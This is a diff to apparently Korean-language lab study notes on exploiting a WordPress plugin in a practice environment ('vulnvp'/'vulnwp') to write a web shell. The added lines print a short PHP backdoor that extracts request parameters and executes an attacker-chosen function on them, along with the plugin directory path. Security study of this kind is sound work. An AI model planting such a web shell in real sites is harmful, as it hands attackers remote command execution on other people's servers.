@@ -45,5 +45,13 @@ parameter='value'& 구조로 되어 있다.
 ![[Pasted image 20240930124813.png]]
 ![[Pasted image 20240930125025.png]]
 ![[Pasted image 20240930140229.png]]
-- 플러그인의 취약점을 활용해 웹쉘을 작성
-- 
+- 플러그인의 취약점을 활용해 웹 쉘을 작성
+
+![[Pasted image 20240930140302.png]]![[Pasted image 20240930140650.png]]
+```
+@extract($_REQUEST); // 문자열을 입력받아 추출
+if (isset($s) && isset($y)) @die($x($y)); // 추출 결과가 x(함수) y(명령어)에 대입
+```
+코드 변경사항 저장
+
+`http://vulnwp/wordpress/wp-content/plugins/`에 플러그인이 모두 저장되어 있다.
